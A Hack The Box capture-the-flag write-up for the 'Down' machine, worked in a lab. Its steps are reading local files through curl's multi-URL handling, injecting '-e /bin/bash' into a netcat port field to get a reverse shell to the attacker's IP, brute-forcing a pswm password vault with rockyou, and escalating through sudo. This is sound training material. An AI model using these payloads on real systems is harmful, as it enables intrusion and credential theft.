---
icon: triple-chevrons-down
cover: ../../../../.gitbook/assets/Screenshot 2026-02-04 154016.png
coverY: 0
---

# HTB-DOWN(VL)

<figure><img src="../../../../.gitbook/assets/image (571).png" alt=""><figcaption></figcaption></figure>

***

### Reconnaissance

#### Initial Port Scan

I started with Rustscan to identify open ports on the target.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ rustscan -a 10.121.224.17 blah blah
```

**Results - 2 Open Ports:**

**PORT 22/tcp - SSH**

* Service: OpenSSH 8.9p1 Ubuntu 3ubuntu0.11
* OS: Ubuntu Linux (likely 22.04 Jammy)

**PORT 80/tcp - HTTP**

* Service: Apache httpd 2.4.52 (Ubuntu)
* Title: "Is it down or just me?"

**Key Findings:**

* Ubuntu 22.04 Jammy LTS based on OpenSSH and Apache versions
* All ports show TTL 63 (Linux one hop away)
* Web application running on port 80

***

### Enumeration

#### Web Application Analysis (Port 80)

**Initial Observation:**

The website is a service that checks if other websites are up or down.

**Testing the functionality:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ python3 -m http.server 80
```

When I entered my attacker IP in the form, I received a request:

```
10.121.224.17 - - [03/May/2025 04:40:08] "GET / HTTP/1.1" 200 -
```

The site reported my server as "up" - confirming it makes actual HTTP requests to check URLs.

**Testing localhost:**

Entering `http://localhost` also returned "up", indicating the application can access internal services.

#### Technology Stack Analysis

**HTTP Headers:**

```
Server: Apache/2.4.52 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

**Key discoveries:**

* Main page loads as `/index.php` - PHP application
* 404 page is default Apache 404
* POST requests go to `index.php`

**User-Agent detection:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ nc -lnvp 80
GET / HTTP/1.1
Host: 10.10.14.41
User-Agent: curl/7.81.0
Accept: */*
```

The application uses **curl** to make requests!

#### Directory Enumeration

Instead of feroxbuster, I used **dirsearch**:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ dirsearch -u http://10.121.224.17 -e php

[04:26:00] 200 -  739B  - /index.php
[04:26:15] 301 -  319B  - /javascript  ->  http://10.121.224.17/javascript/
[04:26:20] 200 - 1.7KB - /style.css
[04:26:25] 200 - 565KB - /logo.png
```

Nothing interesting - appears to be a single-page application.

***

### Initial Access - File Read via curl

#### Bypassing HTTP Protocol Filter

**Testing file:// protocol:**

Initial attempt failed:

```
POST /index.php
url=file:///etc/passwd

Response: "Only protocols http or https allowed."
```

**Filter bypass discovery:**

The application checks if the URL starts with `http://` or `https://`. However, curl accepts multiple URLs!

**Testing:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ curl -s http://localhost/test1 http://localhost/test2
[Returns content from both URLs]
```

**Exploitation:**

```
POST /index.php
url=http:// file:///etc/hostname

Response shows content of /etc/hostname!
```

The space breaks the first URL (making it invalid) but curl still processes the second URL with `file://` protocol.

#### Reading Application Source Code

**Reading current working directory:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ curl 'http://10.121.224.17/index.php' -d 'url=http:// file:///proc/self/cwd/index.php' -o- -s
```

**Extracted PHP source code analysis:**

The application has two modes:

1. **Normal Mode**: Checks URLs using curl
2. **Expert Mode**: Checks IP/port using netcat

**Expert Mode activation:**

```php
if (isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp') {
    // Shows IP and port form
}
```

Accessing `http://10.121.224.17/index.php?expertmode=tcp` revealed a hidden form!

***

### Exploitation - Parameter Injection in netcat

#### Vulnerability Analysis

**Expert mode code:**

```php
$port = trim($_POST['port']);
$port_int = intval($port);
$valid_port = filter_var($port_int, FILTER_VALIDATE_INT);

if ($valid_ip && $valid_port) {
    $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");
    exec($ec . " 2>&1", $output, $rc);
}
```

**Critical vulnerability:**

The code validates `$port_int` (converted to integer) but uses `$port` (original string) in the command!

**PHP intval() behavior:**

```php
intval("1234 extra text") = 1234  // Returns only the integer part
```

**Exploitation strategy:**

```
Port: 80 -e /bin/bash
↓
intval("80 -e /bin/bash") = 80  ✓ Valid integer
↓
Command executed: nc -vz 10.10.14.41 80 -e /bin/bash
```

The `-e /bin/bash` parameter makes netcat execute a shell!

#### Getting Reverse Shell

**Setup listener:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ nc -lnvp 443
```

**Sending exploit via Burp Repeater:**

```
POST /index.php?expertmode=tcp HTTP/1.1
Host: 10.121.224.17
Content-Type: application/x-www-form-urlencoded

ip=10.10.14.41&port=443 -e /bin/bash
```

**Shell received:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.121.224.17 45706

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Shell upgrade:**

```bash
www-data@down:/var/www/html$ script /dev/null -c /bin/bash
www-data@down:/var/www/html$ ^Z

┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ stty raw -echo; fg
reset
Terminal type? screen

www-data@down:/var/www/html$
```

***

### Privilege Escalation to aleks

#### Post-Exploitation Enumeration

**Users with home directories:**

```bash
www-data@down:/home$ ls
aleks
```

**Accessible files in aleks's home:**

```bash
www-data@down:/home/aleks$ find . -type f 2>/dev/null
./.bashrc
./.sudo_as_admin_successful
./.local/share/pswm/pswm
./.profile
./.bash_logout
```

**Key discovery:** `.local/share/pswm/pswm` - a password manager file!

#### Understanding pswm

**pswm** = "Password Manager" - A command-line password manager written in Python.

```bash
www-data@down:/home/aleks$ which pswm
/usr/bin/pswm

www-data@down:/home/aleks$ pswm
PermissionError: [Errno 13] Permission denied: '/var/www/.local'
```

**Password vault file structure:**

```bash
www-data@down:/home/aleks$ cat .local/share/pswm/pswm
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
```

Four base64-encoded encrypted strings separated by asterisks.

#### Decrypting the Password Vault

**Method 1: Manual Python Script**

Analyzed `/usr/bin/pswm` source code:

```python
def encrypted_file_to_lines(file_name, master_password):
    with open(file_name, 'r') as file:
        encrypted_text = file.read()
    
    decrypted_text = cryptocode.decrypt(encrypted_text, master_password)
    if decrypted_text is False:
        return False
    
    return decrypted_text.splitlines()
```

**Created brute-force script:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ nano brute-pwsm.py
```

```python
# /// script
# requires-python = ">=3.12"
# dependencies = [
#     "cryptocode",
# ]
# ///
import cryptocode
import sys

if len(sys.argv) != 3:
    print(f"usage: {sys.argv[0]} <pwsm file> <wordlist>")
    sys.exit()

with open(sys.argv[1], 'r') as f:
    pwsm = f.read()

with open(sys.argv[2], 'rb') as f:
    passwords = f.read().decode(errors='ignore').split('\n')

for password in passwords:
    pt = cryptocode.decrypt(pwsm, password.strip())
    if (pt):
        print(f"Found password: {password}")
        print(pt)
        break
```

**Adding dependencies:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ uv add --script brute-pwsm.py cryptocode
Updated `brute-pwsm.py`
```

**Downloading the encrypted file:**

```bash
www-data@down:/home/aleks$ cat .local/share/pswm/pswm > /tmp/pswm_vault

┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ scp www-data@10.121.224.17:/tmp/pswm_vault ./pswm
```

**Running the brute-force:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ time uv run brute-pwsm.py pswm /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
Found password: flower
pswm    aleks   flower
aleks@down      aleks   1uY3w22uc-Wr{xNHR~+E

real    0m3.321s
```

**Method 2: Using pswm-decryptor**

Alternative tool from GitHub:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ wget https://raw.githubusercontent.com/n0kovo/pswm-decryptor/main/pswm-decrypt.py

┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ uv add --script pswm-decrypt.py cryptocode prettytable

┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ time uv run pswm-decrypt.py -f pswm -w /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
[+] Master Password: flower
[+] Decrypted Data:
+------------+----------+----------------------+
| Alias      | Username | Password             |
+------------+----------+----------------------+
| pswm       | aleks    | flower               |
| aleks@down | aleks    | 1uY3w22uc-Wr{xNHR~+E |
+------------+----------+----------------------+

real    0m1.879s
```

**Credentials obtained:**

* **Username:** aleks
* **Password:** 1uY3w22uc-Wr{xNHR\~+E

#### Accessing as aleks

**Method 1: su (from www-data shell):**

```bash
www-data@down:/home/aleks$ su - aleks
Password: 1uY3w22uc-Wr{xNHR~+E
aleks@down:~$
```

**Method 2: SSH:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/DOWN]
└─$ sshpass -p '1uY3w22uc-Wr{xNHR~+E' ssh aleks@10.121.224.17
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-138-generic x86_64)

aleks@down:~$
```

***

### Privilege Escalation to root

#### Sudo Enumeration

```bash
aleks@down:~$ sudo -l
[sudo] password for aleks: 
Matching Defaults entries for aleks on down:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User aleks may run the following commands on down:
    (ALL : ALL) ALL
```

**aleks has full sudo privileges!**

#### Getting root Shell

```bash
aleks@down:~$ sudo -i
root@down:~#
```

***

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
